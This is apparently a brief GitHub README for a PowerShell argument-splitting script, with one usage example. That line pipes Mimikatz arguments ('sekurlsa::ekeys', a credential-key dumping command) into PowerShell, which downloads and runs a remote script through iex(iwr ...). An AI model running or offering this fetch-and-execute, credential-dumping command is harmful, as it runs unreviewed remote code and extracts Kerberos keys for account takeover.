# Powershell-Misc
Split arguments.

Usage :
```
echo '"sekurlsa::ekeys" "exit"'| powershell -c "(iex(iwr https://raw.githubusercontent.com/zief/Powershell-Misc/main/argsplit.ps1 -usebasicparsing))"
```
